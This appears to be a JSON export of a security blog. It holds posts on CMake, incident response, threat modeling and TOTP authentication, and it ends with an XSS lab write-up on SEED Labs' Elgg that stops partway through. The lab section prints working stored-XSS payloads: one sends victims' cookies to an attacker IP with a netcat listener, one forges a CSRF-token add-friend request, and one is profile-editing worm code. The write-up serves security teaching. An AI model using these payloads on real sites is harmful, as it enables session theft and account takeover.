generator.Build System Generation - CMakeCMake is not a build system but a tool that is a build system generator. Usually, a C++ project requires just the following steps after a GitHub clone to run →mkdir buildcd buildcmake..makeThe first step is just to keep the code clean and build everything in a separate directory. The third step i.e., the cmake call is to generate a Makefile. An example is, say one has the following files - main.cpp, a.cpp, a.h, b.cpp, b.h. The main.cpp file has the main() function and depends on the files a.cpp and b.cpp. Therefore, one must run g++ compiler on a.cpp, then on b.cpp and finally on main.cpp with the compile flag i.e., -c. Header files are not compiled. They just tell the compiler about the function declaration.Then to link them all together, one must call → g++ a.o b.o main.o -o binary. Thus, one must compile and link the code in two different orderly steps to generate a binary/executable. To make this easy for a number of files, a tool or a build system named Make was developed. This reduced the steps to writing a Makefile and then running the make tool by pointing it to the location of the Makefile.Though after a point, writing Makefiles too became tedious, the solution to which was a tool called cmake which generates Makefiles using a relatively simpler and easy to maintain CMakeLists.txt file. This is why it’s called a build system generator. Thus, running the cmake tool and pointing it to the location of the CMakeLists.txt file creates a Makefile in the present working directory. After this, just calling the make tool to work on the Makefile will build the project (by default it looks under the build directory unless a specific location is specified).CMakeLists details and file typesThe main types of files that are dealt with are → archive files (.a), shared objects (.so), header files (.h) and objects (.o). To create object files, the .c or .cpp file is compiled with the -c flag. Files with suffix .a are called archived files which are used as a statically linked binary i.e., when it is linked with the program, all code defined in the archive is included in the binary.To create the archive, the following command is used → gcc -c source1.cgcc -c source2.car -cvq libtest.a source1.o source2.ogcc main.c libtest.a -o finalThe last command is where the main.c file is compiled with the archive file. The files with the suffix .so are shared objects which are not included in the final executable. To create a shared library, an object file must be compiled as position independent code or PIC. This is done as follows → gcc -fPIC -c source1.c source2.c gcc -shared -o libtest.so source1.o source2.oTo link the code of either archived files or shared objects, the -l flag is used as follows →gcc main.c -ltest -o finalThe -ltest argument looks for either libtest.so or libtest.a. Some projects provide both a dynamic shared library and a statically linked library to let the user choose the required method. The other way for using a statically linked library is as shown earlier while creating the archive. Header files (.h) are not compiled. They are included in .c files to inform the compiler about functions. Once the compiler cross-references everything, their information is discarded and they do not affect the final executable size. The capital i flag, -I, is used to specify which directories contain header files. The flag -L is used to tell the compiler which directories contain the static libraries (.a). The lowercase l flag, -l, is used to specify the name of the library to be linked i.e., -l test means that the compiler looks for libtest.a or testlib.a or a similar shared object.CMakeA standard compile command needs to have the following basic things → Path to files that need to be compiled. Path to header files including those which are used from third party libraries. Paths to third party libraries’ .a files. Names of the .a files that the compiler should link with the code.This is automated by CMake, which has 5 major sections - flags, files, include, targets, external libraries, unit testing. In order, a CMakeLists.txt file will have the following (prefixed with #) → Version → This is to tell CMake which version of the tool to use. Cannot use a version lower than that specified. Project Name Flags → Tells CMake which compiler and version of compiler to use to build the project with. With an empty value, it sets the best fit on its own. Files → Specify all files and club them into variable names like source, include, etc. But this can be skipped and the filenames can be used directly. Include → This is used to specify the path of include directories that the compiler must look into while searching for header files. This also includes header files from third party libraries. Target → The name of the output file is specified first. All names after that are the source files that need to be compiled. &lt;output&gt; External Library → The linking of libraries. In previous steps the location of header files for third party libraries were informed to the compiler. This step is used to inform it about the location of the libraries. By convention, library files are named with lib as a prefix or suffix. If a .a file has already been compiled and CMake isn’t required to do it, then the following is written → add_library(&lt;name from libname.a&gt; STATIC IMPORTED) set_property(TARGET &lt;name&gt; PROPERTY IMPORTED_LOCATION ${CMAKE_SOURCE_DIR}/&lt;path to .a file from there&gt;) target_link_libraries(&lt;output&gt; &lt;name&gt;) If the library is not compiled, but has a CMakeLists.txt file of its own then the following can be written → add_subdirectory(&lt;path to library directory with CMakeLists.txt&gt;/&lt;library_project_name&gt;) target_link_libraries(&lt;output&gt; &lt;filename of .a that results from internal CMakeLists.txt&gt;) This concludes the CMakeLists.txt file. An example CMakeLists.txt file is as follows →cmake_minimum_required( VERSION 3.0 )project( sample_cmake )# flags# include filesinclude_directories( ./include ./src ./libs/Logger/include ./libs/Randomize/include )# targetadd_executable( binary ./src/main.cpp ./src/game_engine.cpp ./src/game_interface.cpp )# 3rd party libsadd_subdirectory( ./libs/Logger )target_link_libraries( binary logger )add_library(randomize STATIC IMPORTED)set_property(TARGET randomize PROPERTY IMPORTED_LOCATION ${CMAKE_SOURCE_DIR}/libs/Randomize/librandomize.a)target_link_libraries( binary randomize )" }, { "title": "Introduction to Incident Response", "url": "/blog/posts/incident-response/", "categories": "Computers and Security", "tags": "security, incident-response", "date": "2020-11-07 02:00:00 -0500", "snippet": "BHIS IR Card game.The following sections are taken from a card game made by Black Hills Information Security (BHIS).Injects Management has approved the release of a new procedure → Once in a while...", "content": "BHIS IR Card game.The following sections are taken from a card game made by Black Hills Information Security (BHIS).Injects Management has approved the release of a new procedure → Once in a while, the C-suite approves some procedures, etc. which can be useful. The main person who runs the IR process can be involved in explanatory meetings that can cause the other members to feel pressured. An intern can reek damage on systems that are being reviewed by IR personnel. Lead handlers can be on emergency leaves which can cause issues in handling situations. Analysts can be trained in special respects which can be an asset to the teams. Test situations can be set up, for example → Management can hire a Red team for assessment, which can also be a test on the IR. Deploying honeypots can be effective to handle some sort of response.Initial Compromise Credential Stuffing → The attackers take advantage of third party breaches to identify and use IDs and passwords against your organization. Detection → Server Analysis, UEBA Exploitable External Service → An external service could have a misconfiguration or a publicly available exploit that the attackers can take advantage of, to attack and pivot to internal resources. Detection → Firewall Log Review, Server Analysis Exploited BYOD (Bring Your Own Device) → This can be used as an entry point to compromising organizational networks. Detection → Firewall Log Review, Netflow, Zeek/Bro, RITA Social Engineering → Tricking users to download malware. Detection → Endpoint Security Protection Analysis, User Awareness Training Trusted Relationship → A trusted third party who has access to the network can be an entry point if compromised. Detection → SIEM Log analysis, UEBA Password Sprays → Spraying commonly used passwords in the network. Detection → SIEM Log analysis, UEBA, Firewall Log Review Insider Threat → An internal disgruntled user exfiltrates information from the organizational network. Detection → UEBA, Working with HR, DLP is a false hope External Cloud Access → The attackers can use cloud resources to gain access. Detection → SIEM Log analysis Web Server Compromise → The attackers take over an external web server and use it to pivot to the organizational network. Detection → Server Analysis, SIEM Log analysis, Netflow, Zeek/Bro, RITA Phish → The attackers send a malicious email targeting users because they are easy to attack. Detection → Firewall Log review, Endpoint Security Protection AnalysisPivot and Escalate Local Privilege Escalation → Attackers use a vulnerability in the local software to gain administrative access. Detection → Endpoint Analysis, Endpoint Security Protection Analysis New Service Creation → Attackers create and load their malware using a service with system/root privileges, or create a new service. Detection → Endpoint Analysis, Endpoint Security Protection Analysis Accessibility Features → The attackers hijack accessibility features like sticky keys and onscreen keyboard. Detection → Endpoint Analysis, Endpoint Security Protection Analysis Credential Stuffing → Valid AD credentials have been discovered on open shares and files within the environment. Detection → SIEM Log analysis, UEBA, Internal Segmentation Weaponizing AD → The attacker map trust relationships and user/group privileges in the AD network. Detection → SIEM Log analysis, UEBA, Internal Segmentation Broadcast/Multicast Protocol Poisoning → LLMNR (Link Local Multicast Name Resolution) lets a host ask for name resolution from any system on the same network. The attackers perform the poisoning on the AD network. Detection → CredDefense Toolkit, UEBA, Firewall Log review Kerberoasting → The attackers use a feature of SPNs (Service Principle Names) to extract and crack service passwords. Detection → SIEM Log analysis, UEBA, Honey Services, Internal Segmentation Internal Password Spray → The attackers start a password spray against the rest of the organization from a compromised system. Detection → UEBA, SIEM Log analysisPersistence Evil Firmware → Attackers update the firmware of the Network Cards, Video Cards and BIOS (or UEFI) with malicious ones. These are difficult to detect as well as to update. Detection → Endpoint Analysis, Endpoint Security Protection Analysis, Prayers to God (lol) Logon Scripts → Attackers install a script that triggers when a user logs on. Detection → Endpoint Analysis, Endpoint Security Protection Analysis Malicious Browser Plugins → Attackers install plugins in the browser, which can be used as part of C2 and persistence. The browser becomes the new endpoint. Detection → Endpoint Analysis, Endpoint Security Protection Analysis, Firewall Log review, Netflow, Zeek/Bro, RITA Application Shimming → Attackers use the Application Compatibility Toolkit to trick applications into not seeing the ports, directories, files and services the attackers want to hide. Detection → Endpoint Analysis, Endpoint Security Protection Analysis New User added → The attackers add a new user to local computers. Detection → Endpoint Analysis, Endpoint Security Protection Analysis Malicious Driver → The attackers load a malicious driver into the OS. Detection → Endpoint Analysis, Endpoint Security Protection Analysis DLL Attacks → The attackers hijack the order in which DLLs are loaded. This is usually done through insecure permissions. Detection → Endpoint Analysis, Endpoint Security Protection Analysis Malicious Service or Malware → The attackers add a service that starts every time the system starts. Detection → Endpoint Analysis, Endpoint Security Protection AnalysisC2 and Exfil Domain Fronting as C2 → The attackers use Domain Fronting to bounce their traffic off of legitimate systems. Detection → Netflow, Zeek/Bro, RITA Gmail, Tumblr, Salesforce, Twitter as C2 → The attackers route traffic through third party services, many of which are ignored completely by many security tools. Detection → Netflow, Zeek/Bro, RITA Windows BITS (Background Intelligent Transfer Service) → The attackers use BITS, a protocol that is often ignored. Detection → Netflow, Zeek/Bro, RITA DNS as a C2 channel. Detection → Netflow, Zeek/Bro, RITA HTTPS as Exfil → Many malwares use this. Example → Meterpreter has used this since long. This can be used in conjunction with other stego techniques. Detection → Netflow, Zeek/Bro, RITA HTTP as Exfil → This is usually used in conjunction with some form of stego like → VSAgent uses base64 encoded __VIEWSTATE as an exfil field. Detection → Netflow, Zeek/Bro, RITAProcedures Crisis Management → The legal and management teams have procedures for effectively and ethically notifying impacted victims of compromises. A good notification strategy will help deal with a political fallout. Isolation → The network team must isolate infected systems to prevent further harm after an incident. Endpoint Analysis → Defenders use IR cheat sheets like SANS to detect attacks on workstations. This requires interaction with the members sitting on Help Desk. UEBA (User and Entity Behavior Analytics) → It looks for multiple concurrent logins, impossible logins based on geography, unusual file access, password sprays, etc. Endpoint Security Protection Analysis → AV on endpoints must always generate logs which should be monitored and not forgotten. Internal Segmentation → Internal networks must be segmented i.e., treating segments as hostile. Host based firewalls help in this case. Netflow, Zeek/Bro, RITA (Real Intelligence Threat Analysis) → Network traffic must be captured, parsed and reviewed following a documented process. Just running tools is not enough. Firewall Log Review → Emulate attack scenarios and verify the working of procedures in place. Logs from firewalls must be analyzed and understood. SIEM (Security Information and Event Management) → Regular attack scenario emulations can be used to check if they can be detected and logged. Server Analysis → The ability to baseline a system and verify that it is operating in a normal state.Incident ResponsePREPARATIONPreparation is the key to effective incident response. Even the best incident response team cannot effectively address an incident without predetermined guidelines. A strong plan must be in place to support your team. In order to successfully address security events, these features should be included in an incident response plan: Develop and Document IR Policies: Establish policies, procedures, and agreements for incident response management. Define Communication Guidelines: Create communication standards and guidelines to enable seamless communication during and after an incident. Incorporate Threat Intelligence Feeds: Perform ongoing collection, analysis, and synchronization of your threat intelligence feeds. Conduct Cyber Hunting Exercises: Conduct operational threat hunting exercises to find incidents occurring within your environment. This allows for more proactive incident response. Assess Your Threat Detection Capability: Assess your current threat detection capability and update risk assessment and improvement programs.The following resources may help you develop a plan that meets your company’s requirements: NIST Guide: Guide to Test, Training, and Exercise Programs for IT Plans and Capabilities SANS Guide: SANS Institute InfoSec Reading Room, Incident Handling, Annual Testing and TrainingDETECTION AND REPORTINGThe focus of this phase is to monitor security events in order to detect, alert, and report on potential security incidents. Monitor: Monitor security events in your environment using firewalls, intrusion prevention systems, and data loss prevention. Detect: Detect potential security incidents by correlating alerts within a SIEM solution. Alert: Analysts create an incident ticket, document initial findings, and assign an initial incident classification. Report: Your reporting process should include accommodation for regulatory reporting escalations.TRIAGE AND ANALYSISThe bulk of the effort in properly scoping and understanding the security incident takes place during this step. Resources should be utilized to collect data from tools and systems for further analysis and to identify indicators of compromise. Individuals should have in-depth skills and a detailed understanding of live system responses, digital forensics, memory analysis, and malware analysis. As evidence is collected, analysts should focus on three primary areas: Endpoint Analysis Determine what tracks may have been left behind by the threat actor. Gather the artifacts needed to build a timeline of activities. Analyze a bit-for-bit copy of systems from a forensic perspective and capture RAM to parse through and identify key artifacts to determine what occurred on a device. Binary Analysis Investigate malicious binaries or tools leveraged by the attacker and document the functionalities of those programs. This analysis is performed in two ways. Behavioral Analysis: Execute the malicious program in a VM to monitor its behavior Static Analysis: Reverse engineer the malicious program to scope out the entire functionality. Enterprise Hunting Analyze existing systems and event log technologies to determine the scope of compromise. Document all compromised accounts, machines, etc. so that effective containment and neutralization can be performed. CONTAINMENT AND NEUTRALIZATIONThis is one of the most critical stages of incident response. The strategy for containment and neutralization is based on the intelligence and indicators of compromise gathered during the analysis phase. After the system is restored and security is verified, normal operations can resume. Coordinated Shutdown: Once you have identified all systems within the environment that have been compromised by a threat actor, perform a coordinated shutdown of these devices. A notification must be sent to all IR team members to ensure proper timing. Wipe and Rebuild: Wipe the infected devices and rebuild the operating system from the ground up. Change passwords of all compromised accounts. Threat Mitigation Requests: If you have identified domains or IP addresses that are known to be leveraged by threat actors for command and control, issue threat mitigation requests to block the communication from all egress channels connected to these domains.POST-INCIDENT ACTIVITYThere is more work to be done after the incident is resolved. Be sure to properly document any information that can be used to prevent similar occurrences from happening again in the future. Complete an Incident Report: Documenting the incident will help to improve the incident response plan and augment additional security measures to avoid such security incidents in the future. Monitor Post-Incident: Closely monitor for activities post-incident since threat actors will re-appear again. We recommend a security log hawk analyzing SIEM data for any signs of indicators tripping that may have been associated with the prior incident. Update Threat Intelligence: Update the organization’s threat intelligence feeds. Identify preventative measures: Create new security initiatives to prevent future incidents. Gain Cross-Functional Buy-In: Coordinating across the organization is critical to the proper implementation of new security initiatives.Resources The Five Steps of Incident Response Black Hills Information SecurityMore Resources Incident Response Playbooks Gallery Incident Response SANS: The 6 Steps in Depth" }, { "title": "Introduction to Threat Modeling", "url": "/blog/posts/threat-modeling/", "categories": "Computers and Security", "tags": "security, threat-modeling", "date": "2020-10-14 03:00:00 -0400", "snippet": "Threat ModelingThreat modeling is best applied continuously throughout a software development project. Following is a four question framework that helps understand threat modeling → What are we wor...", "content": "Threat ModelingThreat modeling is best applied continuously throughout a software development project. Following is a four question framework that helps understand threat modeling → What are we working on? What can go wrong? What are we going to do about it? Did we do a good job? The following are the steps to be taken for threat modeling → Assessment Scope → Identifying tangible assets, like databases of information or sensitive files, understanding the capabilities provided by the application and valuing them. Identify Threat Agents and Possible Attacks → Characterization of the different groups of people who might be able to attack the application, both insiders and outsiders performing inadvertent mistakes or malicious attacks. Understand Existing Countermeasures Identify Exploitable Vulnerabilities Prioritize Identified Risks → For each threat, estimate a number for likelihood and impact factors to determine an overall risk or severity level. Identify Countermeasures to Reduce ThreatGeneric questions for a threat modeling exercise What is the scope of infrastructure covered? (he number of devices and servers, the type of servers) What type of system is it? Client-Server based or service based? What are the assets? What data is handled? Who is the provider? Who is the customer? What technologies are being used for the application/software? What kind of data is stored and where? Is the data store encrypted? Who has access to the data store? How can it be accessed? What are the entry points to the system? (points of entry for the attacker like website, service at port xx, etc.) What functions does the application perform? Is any function privileged? Is there an authorization system in place for privileged functions? How many sub systems make up the entire application? How do those sub systems communicate? Is the communication secure (SSL/TLS)? Is the communication? Do usual actions employ Failsafe default and Least privilege? What kind of authentication system is in place (OAuth, MFA, etc.)? How is authentication maintained over time? What kind of data is logged and monitored by the system and/or the sub systems? Do the logs contain sensitive information? Are log files accessible based on authorization? Is there some kind of backup in place? Is the backup secured? Where is the backup stored? How is data sent there (transit)? Looking at STRIDE, what sort of attacks are possible based on gathered information? (Spoofing, Tampering, Repudiation, Information disclosure, Denial of Service, Elevation of privileges) Do the sub systems store different kinds of data in different places? How does one compromised sub system affect the other? What are the current countermeasures in place?Resources Threat Modeling CRV2 App Threat Modeling What is Identity and Access Management" }, { "title": "Authentication and 2FA", "url": "/blog/posts/authentication-2fa/", "categories": "Computers and Security", "tags": "security, authentication, mfa", "date": "2020-10-13 03:00:00 -0400", "snippet": "AuthenticationBasic AuthenticationIt is the simplest authentication mechanism which is part of the HTTP protocol. It is a challenge response scheme where the server challenges the client to provide...", "content": "AuthenticationBasic AuthenticationIt is the simplest authentication mechanism which is part of the HTTP protocol. It is a challenge response scheme where the server challenges the client to provide information to access a resource. The username and password is encoded using base64 and the value is set in the Authorization header and send it along in each HTTP request. Example → Authorization: Basic XAAUVBBhHI87I== . It is easy to implement and thus has faster APIs. In a non-SSL network, the encoding is basically useless. Sending the credentials in every HTTP request increases the attack surface.Digest based AuthenticationThis is an upgraded version of Basic Authentication. Instead of the base64 encoded strings, the server provides a digest for the client to use while encoding the username and password. Thus, the encoding is not universally known. When a client requests a resource without any authorization, the server sets the header with a certain digest information. The credentials are hashed using the digest and sent to the server along with the new request, which is decoded by the server and it grants the resource for valid credentials. This is still vulnerable to Man in The Middle attacks. It also requires 2 requests to a resource, the first of which is always wasted.Cookie/Session based AuthenticationThis is most commonly used in web apps. The credentials (username and password) are set in the parameters of a form and sent along in a request. The server validates the login and creates a cookie which is sent back in the response. The client uses this cookie to make future requests. This eliminates the need to send credentials in every request while enabling state maintenance in a stateless system. The validity of a cookie can be revoked anytime. It is generally useful for only Single domain systems. For multiple web apps and a separate client, the issue of CSRF arises. The session information is required to be stored in a database which questions the scalability.Token based AuthenticationThis is a form of stateless authentication. Instead of sending credentials for authentication, a server generated token is used. OAuth, JWT and OpenID are types of token based authentication.JWT → When a user submits a username and password, the server validates it and returns a signed Jason Web Token. The token is used to allow future requests. The server doesn’t bear the overhead of session information. It solves the issue of CSRF. However, the access to a user cannot be revoked and the safety of the token relies entirely on the consumer.OAuth2 → This is an advanced token based authentication. Examples include signing with Facebook/Google/Apple. The user sends an authentication requests to Google/Facebook. Given the user has an account on Google or Facebook, the server responds with an authorization grant. Using this, the client requests an access token from the Authentication server. This token is sent to the application server, which validates the access token from the authentication server. Then the user is granted access to the resource.SSO → Personal computers are a classic example of Single Sign On systems i.e., enter password once to get access to all the apps. Google is another example → A user trying to access Google forms sends a request to the forms service, which in turn calls the authentication service to make sure that the user is in fact logged in. If the user is not authenticated, then the service presents the login screen to authenticate the user. The advantage is that users need to remember only one password and it is secure because all services are being handled by one master authentication service.Two Factor AuthenticationThis is a subset of multi-factor authentication. TOTPs, Validation emails, Location (like GPay), Inherent factors such as Fingerprint and Iris scan, Knowledge based such as security questions are some of the factors used for 2FA/MFA. A threat model is essentially a structured representation of all the information that affects the security of an application. In essence, it is a view of the application and its environment through security glasses. It is a family of activities for improving security by identifying objectives and vulnerabilities, and then defining countermeasures to prevent, or mitigate the effects of, threats to the system.2FA using TOTPs (Basic Implementation → Google Authenticator)2FA is a new method for generating not normal OTPs, but TOTPs (Time based One Time Passwords). Providers for 2FA services are → Google Authenticator, LastPass Authenticator, Microsoft Authenticator, Authy by Twilio, etc. TOTP is an algorithm that factors in the current time to generate a unique one-time password. TOTPs are secure because → The password changes every n number of seconds (usually, 30 seconds), preventing eavesdroppers from using the same password later if they’re able to get a hold of it. The password may be generated by an app on the user’s phone, making it more difficult for an attacker to acquire the password, as the user’s phone is usually by his/her side, unlike carrier messages which are susceptible to SIM theft.TOTPs are user friendly because the user need only enter the password from an app or allow logins for integrated authenticators. TOTPs rely on the algorithm for HMAC based OTPs (HOTPs). This document is an explanation on the implementation of both these algorithms as used by Google in Google Authenticator.Generating SecretThe first step is the creation of an application specific secret that will be used to verify the OTPs. This key will also be shared with the Authenticator app. It is using this secret key that the apps know what OTPs to generate for the authentication in apps or websites. One way of generating the secret is to generate a completely random buffer of data and encode it to base32. This can be done in NodeJS as follows →const crypto = require('crypto');const base32 = require('hi-base32');function generateSecret(length = 20) { const randomBuffer = crypto.randomBytes(length); return base32.encode(randomBuffer).replace(/=/g, '');}Generating HOTPsThis step requires a secret key and a counter value. The secret is generated as shown in the above step. The counter value will be provided to the app when TOTPs are generated. The HOTP function accepts two arguments → secret and counter. The function first decodes the secret from base32. Then it creates a buffer from the counter value. A SHA-1 (in case of Google Authenticator) is used with the secret as the key and the buffer as the parameter. The HMAC result produced will be a 20 byte string. A 4 byte binary code is then extracted using dynamic truncation. Then, the first 6 digits of this code is extracted to get the final HOTP value. This process can be shown as a code block as follows →const crypto = require('crypto');const base32 = require('hi-base32');function generateHOTP(secret, counter) { const decodedSecret = base32.decode.asBytes(secret); const buffer = Buffer.alloc(8); for (let i = 0; i &lt; 8; i++) { buffer[7 - i] = counter &amp; 0xff; counter = counter &gt;&gt; 8; } // Step 1: Generate an HMAC-SHA-1 value const hmac = crypto.createHmac('sha1', Buffer.from(decodedSecret)); hmac.update(buffer); const hmacResult = hmac.digest(); // Step 2: Generate a 4-byte string (Dynamic Truncation) const code = dynamicTruncationFn(hmacResult); // Step 3: Compute an HOTP value return code % 10 ** 6;}function dynamicTruncationFn(hmacValue) { const offset = hmacValue[hmacValue.length - 1] &amp; 0xf; return ( ((hmacValue[offset] &amp; 0x7f) &lt;&lt; 24) | ((hmacValue[offset + 1] &amp; 0xff) &lt;&lt; 16) | ((hmacValue[offset + 2] &amp; 0xff) &lt;&lt; 8) | (hmacValue[offset + 3] &amp; 0xff) );}Generating TOTPsThe algorithm for generating TOTPs uses current time with a time-step of 30 seconds as the counter value in the generateHOTP function. The counter value can be generated as follows →const counter = Math.floor(Date.now() / 30000);The function to generate the TOTP also accepts a window parameter which helps get the TOTP of any time window from the current time. Example → TOTP 2 mins back was at window=-4. The function can be written as follows →function generateTOTP(secret, window = 0) { const counter = Math.floor(Date.now() / 30000); return generateHOTP(secret, counter + window);}Verification of TOTPsThe secret key is used to verify the TOTPs. The generateTOTP function is used to calculate the TOTP again and the value is checked to see if it matches or not. To improve experience of the user, the previous window’s TOTP is also checked. Given variable token is the generated TOTP from the app, the verification function can be written as follows →function verifyTOTP(token, secret, window = 1) { if (Math.abs(+window) &gt; 10) { console.error('Window size is too large'); return false; } for (let errorWindow = -window; errorWindow &lt;= +window; errorWindow++) { const totp = generateTOTP(secret, errorWindow); if (token === totp) { return true; } } return false;}Resources Hacker Noon: How To Implement Google Authenticator Two Factor Auth in JavaScript Security Models: Authentication and Authorization Explained" }, { "title": "XSS Attack Lab - SeedLabs", "url": "/blog/posts/xss-attack-lab/", "categories": "Lab Practice Notes, Seed Labs", "tags": "xss, web-application, lab, seed-labs", "date": "2020-06-01 03:00:00 -0400", "snippet": "The tasks are based on a web application called ELGG which is open source. It is designed to be like an open source version of Facebook or myspace. The prebuilt vm called seedubuntu is used to host...", "content": "The tasks are based on a web application called ELGG which is open source. It is designed to be like an open source version of Facebook or myspace. The prebuilt vm called seedubuntu is used to host the web application and there are a few users already created. Logging in to the web app will be done from a different vm on the same virtual box network.Task 1 : Post a malicious message to display an alert windowThe web app is hosted on seedubuntu vm and ubuntu vm is used to create a new account user11. To make the web app visible as a site named www.xsslabelgg.com, add a name and IP address parameter on the ubuntu vm’s hosts file. Log into the account user11. Go to about me section. This section allows adding ‘about me’ information to our profiles. By default the editor provided is a rich text editor which adds extra text to whatever is inside. This is counterproductive to the attack therefore this editor is removed and the plain text editor is used. The section is used to add javascript code inside it -&lt;script&gt;alert('XSS');&lt;/script&gt;On saving this an alert is displayed on the page. The web app sees the text inside the box to show it o nthe browser but since it is a js code, it gets executed. When some other user, say alice, tries to view the profile of use11, her webpage also gives the alert window.Task 2 : Posting a malicious message to display cookiesThis is along the same lines as the previous task and does similar thing except the new code that is put inside the about me section now displays the cookie. The new code is -&lt;script&gt;alert(document.cookie);&lt;/script&gt;This displays the cookie of user11 when saved. On reloading too it does the same. When a separate user say alice navigates to user11’s account, her own cookie gets displayed. By design, the browser does not display the code, it runs it.Task 3 : Stealing cookies from the victim’s machineThis attack focuses on providing code in the ‘about me’ section such that the attacker can obtain the cookie without having to be preset when the account of user11 is visited. For this the attacker injects a code that basically is a GET request for an image and also adds the cookie of the victim in the url itself.&lt;script&gt;document.write('&lt;img src=http://192.168.56.4:1234?c='+escape(document.cookie)+' &gt;');&lt;/script&gt;The IP address for the http part is the attacker’s IP address. On the attacker machine we can listen o the specified port using netcat or any other means.nc -l -p 1234The next time someone on the web application, say alice visits the profile of user11, the code gets executed and the attacker gains the cookie for himself. The nc output seems like -GET /?c=Elgg%3Dtlgbp3diifsf0007299puq2kr1 HTTP/1.1Host: 192.168.56.4:1234Accept: */*Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: keep-aliveThe cookie starts after %3D.Task 4 : session hijacking using the stolen cookiesThis task is about stealing the session of a legitimate user by using their cookie and then add the victim as a friend. To do this the process of adding a friend has to be known to the attacker. Therefore, the attacker creates another account say samy. This account can be added as a friend to user11’s account to observe the process of adding a friend. The attacker logs in to the account of samy and visits user11. Then he enables the inspect mode of the browser to watch the requests ad cookies as he adds user11 as a friend to samy. The friend addig process then shows a GET request -http://www.xsslabelgg.com/action/friends/add?friend=43&amp;__elgg_ts=152022381&amp;__elgg_token=f0aaab1d9af23flb3lb876bfa5640celAlso, the cookie is sent as a part of the request header. Therefore, the 3 important things noted are - 1. the friend=43 part which specifies the umber associated with the user11 account. 2. the cookie sent as a part of request header. 3. the two parts __elgg_ts and __elgg_token which are tokens used as a countermeasure against the cross site request forgery attack. The above have to be found and can also be found on the view-source page of the website. The two tokens are stored in variables as mentioned above and since they are different for every web user, even if the attacker does not know the tokens of user alice, the name of the two token variables can be used to call the values. The response part for the request under inspect element can help locate these variables being used as - elgg.security.token.__elgg_ts and elgg.security.token.__elgg_token. Using these variables, the attack code can be formed. Use of cookie retrieval technique to retrieve the two tokens as well.&lt;script&gt;document.write('&lt;img src=http://192.168.56.4:1234?c='+elgg.security.token.__elgg_ts+'&amp;'+elgg.security.token.__elgg_token+' &gt;');&lt;/script&gt;The nc output seems like this -GET /?c=1520227817&amp;0fab54e97b2fa75c39d298de602a5939 HTTP/1.1Host: 192.168.56.4:1234Accept: */*Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: keep-aliveThe tokens are separated by the &amp;. If the web app does not match passwords (or the case when we have the password of the intended victim), we can simply use a python script to use the authentication and use requests module to send a GET request and the attack will have been executed. The code will take the input from the nc command and the output of nc command can be split into sections to get the required cookies and the tokens. Then the script can be used to send a request to the desired link using the HTTPBasicAuth module and the cookies and parameters set along with the GET request. This can be used in cases when the script file we make is bigger than the allowed number of characters inside the text box that has the vulnerability.To actually make other accounts execute the malicious code that can trigger them making the attacker their friend, the code needs to be in the same place where the previous codes to obtain cookie and the tokens were placed. This is the case when the password of the victim is not held with the attacker.For this we can use the following code in javascript using AJAX and then store it into the ‘about me’ section of user11. The code is as follows -&lt;script type=\"text/javascript\"&gt;var ts=\"&amp;__elgg_ts=\"+elgg.security.token.__elgg_ts;var token=\"&amp;__elgg_token=\"+elgg.security.token.__elgg_token;var sendurl=\"http://www.xsslabelgg.com/action/friends/add?friend=43\"+ts+token;Ajax=new XMLHttpRequest();Ajax.open(\"GET\",sendurl,true);Ajax.setRequestHeader(\"Host\",\"www.xsslabelgg.com\");Ajax.setRequestHeader(\"Keep-Alive\",\"300\");Ajax.setRequestHeader(\"Connection\",\"keep-alive\");Ajax.setRequestHeader(\"Referer\",\"http://www.xsslabelgg.com/profile/user11\");Ajax.setRequestHeader(\"Cookie\",document.cookie);Ajax.setRequestHeader(\"Content-Type\",\"application/x-www-form-urlencoded\");Ajax.send();&lt;/script&gt;This code forms the GET request to duplicate the add friend action of the web app. When the victim say alice views the homepage of the attacker user11, her browser will read this code and execute the javascript inside the tags. Since the user alice is logged in while the code is executed, the attack will run smoothly and user11 will be added to the friend list of alice.Task 5 : Writing an XSS wormThis task is about coding a worm which can change the information of an account in the web app. This requires the analysis of changing the ‘about me’ section in the web app. The attacker user11 uses the other account samy to update the ‘about me’ section to study the process. The ‘inspect element’ reveals that the process is a POST request which requires few parameters from the document. These parameters are specific to the session and the user, therefore, searching the parameters in the document, they are set as follows - 1. timestamp and token i.e., __elgg_ts and __elgg_token are stored in the document under elgg.security.token section in the html document. 2. user name of the session user is in JSON format variable called elgg.session.user. 3. guid of the session user is also in the elgg.session.user section. 4. the parameter description is the one that specifies what data is stored in the text field of the ‘about me’ section. 5. the description parameter has a control access field called accesslevel[description] which is 2 for private users, 1 for friends, 0 for others - has to be set to 2 always for changing the data in the ‘about me’ section.The objective is to write a javascript code in the ‘about me’ section of user11 such that when someone visits the profile of user11, the status as required by user11 which is also set on his own account will be set on the account of the one who visits user11‘s page. The javascript code must contain the post request required to proceed with the changing of the text in the ’about me’ section. The code is as follows -&lt;script type=\"text/javascript\"&gt;var sendurl=\"http://www.xsslabelgg.com/action/profile/edit\";var ts=elgg.security.token__elgg_ts;var token=elgg.security.token.__elgg_token;ff=new XMLHttpRequest();ff.open(\"POST\",sendurl,true);ff.setRequestHeader(\"Host\",\"www.xsslabelgg.com\");ff.setRequestHeader(\"Keep-Alive\",\"300\");ff.setRequestHeader(\"Connection\",\"keep-alive\");ff.setRequestHeader(\"Cookie\",document.cookie);ff.setRequestHeader(\"Content-Type\",\"application/x-www-form-urlencoded\");ff.setRequestHeader(\"Referer\",\"http://www.xsslabelgg.com/profile/\"+elgg.session.user[\"username\"]+\"/edit\");params=\"__elgg_ts=\"+ts+\"&amp;__elgg_token=\"+token+\"&amp;description=User-11-is-great\"+\"&amp;name=\"+elgg.session.user[\"username\"]+\"&amp;accesslevel[description]=2&amp;guid=\"+elgg.session.user[\"guid\"];ff.send(params);&lt;/script&gt;The above code will first change the user11‘s ’about me’ portion to “User-11-is-great”. Therefore, this will not affect others who view this profile. However, considering we have access to the server (the server has been hacked in our favor), then this script can be embedded in the server website hosting folder, from where it can be sourced like the image format to obtain the cookie and tokens. This way when any user visits the infected profile, the script will get loaded due to the image format js code in the infected profile. Also, this method can be used to change the contents of a user by forming a request using python or any other programming language (assuming the authentication parameters are already with the attacker). The best possible attack for a web app like this one which is vulnerable to XSS is using a proper worm i.e., self propagating worm.Task 6 : Creating a self propagating wormThe parts of adding the attacker as a friend as well as posting on the victim’s account, without the victim’s consent can be combined into one javascript code and then made self propagating.The process of self propagating sees the following approach - The code will have to be replicated by the code itself. This can be done by using the POST method as described in Task 5. The method to do the following is -&lt;script id=\"daut\" 